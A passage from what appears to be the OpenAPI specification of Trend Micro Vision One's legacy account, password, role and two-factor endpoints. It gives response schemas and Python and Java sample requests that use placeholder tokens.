            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/accounts/{email}\";\n        urlPath = urlPath.replace(\"{email}\", \"YOUR_EMAIL\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.delete(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/accounts/roles": {
      "get": {
        "tags": [
          "Roles (Legacy)"
        ],
        "summary": "List roles",
        "description": "Retrieves the list of roles users can select when configuring accounts\n\nNote: This feature is not available for customers that signed up for or expressly updated Trend Vision One after July 3, 2023.\n\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>User Roles</b><br>\n  <ul>\n    <li>View</li>\n  </ul>\n\n</div>\n",
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "data",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "default": "Success"
                    },
                    "data": {
                      "required": [
                        "roles"
                      ],
                      "type": "object",
                      "properties": {
                        "roles": {
                          "type": "array",
                          "items": {
                            "type": "string"
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/accounts/roles'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/accounts/roles\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/accounts/{email}/passwords": {
      "put": {
        "tags": [
          "Password"
        ],
        "summary": "Configure local account password",
        "description": "Configures the account password using the link in the verification message\n\nNote: This feature is not available for customers that signed up for or expressly updated Trend Vision One after July 3, 2023.\n\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>User Accounts</b><br>\n  <ul>\n    <li>View</li>\n    <li>Configure account settings</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "email",
            "in": "path",
            "description": "The parameter should be url encoded.",
            "required": true,
            "schema": {
              "type": "string"
            }
          }
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "title": "empty object",
                "required": [
                  "password",
                  "token"
                ],
                "type": "object",
                "properties": {
                  "password": {
                    "type": "string"
                  },
                  "token": {
                    "type": "string",
                    "description": "The token can be extracted from the verification link.\n"
                  }
                }
              }
            }
          },
          "required": false
        },
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "default": "Success"
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-codegen-request-body-name": "root",
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/accounts/{email}/passwords'\nurl_path = url_path.format(**{'email': 'YOUR_EMAIL'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'password': 'YOUR_PASSWORD (string)',\n    'token': 'YOUR_TOKEN (string)'\n}\n\nr = requests.put(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/accounts/{email}/passwords\";\n        urlPath = urlPath.replace(\"{email}\", \"YOUR_EMAIL\");\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"password\\\": \\\"YOUR_PASSWORD (string)\\\",\" +\n                \"    \\\"token\\\": \\\"YOUR_TOKEN (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.put(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/accounts/{email}/passwords/sendEmails": {
      "post": {
        "tags": [
          "Password"
        ],
        "summary": "Send account verification message",
        "description": "Sends a verification message with a link to the password configuration screen\n\nNote: This feature is not available for customers that signed up for or expressly updated Trend Vision One after July 3, 2023.\n\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>User Accounts</b><br>\n  <ul>\n    <li>View</li>\n    <li>Configure account settings</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "email",
            "in": "path",
            "description": "The parameter should be url encoded.",
            "required": true,
            "schema": {
              "type": "string"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "default": "Success"
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/accounts/{email}/passwords/sendEmails'\nurl_path = url_path.format(**{'email': 'YOUR_EMAIL'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\nbody = {}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/accounts/{email}/passwords/sendEmails\";\n        urlPath = urlPath.replace(\"{email}\", \"YOUR_EMAIL\");\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"null\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/accounts/mfa": {
      "get": {
        "tags": [
          "Two-Factor Authentication"
        ],
        "summary": "Get two-factor authentication status",
        "description": "Retrieves the status of two-factor authentication for local accounts\n\nNote: This feature is not available for customers that signed up for or expressly updated Trend Vision One after July 3, 2023.\n\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>User Accounts</b><br>\n  <ul>\n    <li>View</li>\n  </ul>\n\n</div>\n",
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "default": "Success"
                    },
                    "data": {
                      "required": [
                        "enabled"
                      ],
                      "type": "object",
                      "properties": {
                        "enabled": {
                          "type": "boolean"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/accounts/mfa'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/accounts/mfa\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/roles": {
      "get": {
        "tags": [
          "Roles (Legacy)"
        ],
        "summary": "List roles used in company accounts",
        "description": "Retrieves the list of roles used in company accounts and their permissions\n\nNote: This feature is not available for customers that signed up for or expressly updated Trend Vision One after July 3, 2023.\n\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>User Roles</b><br>\n  <ul>\n    <li>View</li>\n  </ul>\n  <b>User Accounts</b><br>\n  <ul>\n    <li>View</li>\n  </ul>\n\n</div>\n",
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "data",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "default": "Success"
                    },
                    "data": {
                      "required": [
                        "items"
                      ],
                      "type": "object",
                      "properties": {
                        "items": {
                          "type": "array",
                          "items": {
                            "type": "object",
                            "properties": {
                              "role": {
                                "type": "string"
                              },
                              "permissions": {
                                "type": "object",
                                "description": "Indicate whether the user account with this role has permission to access the api. \n* 0 - No access \n* 1 - Full access",
                                "additionalProperties": {
                                  "type": "object",
                                  "additionalProperties": {
                                    "oneOf": [
                                      {
                                        "type": "integer"
                                      },
                                      {
                                        "type": "object",
                                        "additionalProperties": {
                                          "type": "integer"
                                        }
                                      }
                                    ]
                                  }
                                }
                              },
                              "description": {
                                "type": "string"
                              },
                              "lastUpdateTime": {
                                "type": "integer"
                              },
                              "accounts": {
                                "type": "array",
                                "items": {
                                  "type": "object",
                                  "properties": {
                                    "name": {
                                      "type": "string"
                                    },
                                    "email": {
                                      "type": "string"
                                    },
                                    "type": {
                                      "type": "integer"
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
